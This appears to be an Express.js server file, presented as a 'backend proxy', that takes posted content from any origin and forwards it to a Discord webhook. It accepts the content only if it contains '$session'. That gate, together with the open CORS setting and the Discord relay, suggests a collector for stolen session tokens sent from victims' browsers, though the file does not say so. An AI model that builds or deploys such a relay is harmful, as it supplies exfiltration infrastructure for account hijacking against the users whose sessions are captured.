const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.send('Backend proxy server is running!');
});

app.post('/send-webhook', (req, res) => {
  const content = req.body.content;
  if (!content || !content.includes('$session')) {
    return res.status(400).json({ error: 'Invalid content' });
  }

  // Your Discord webhook URL (keep secret in env var in production)
  const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';

  fetch(webhookURL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ content }),
  })
  .then(response => {
    if (!response.ok) {
      return res.status(500).json({ error: 'Failed to send webhook' });
    }
    res.status(200).json({ message: 'Webhook sent' });
  })
  .catch(err => {
    res.status(500).json({ error: 'Error sending webhook' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
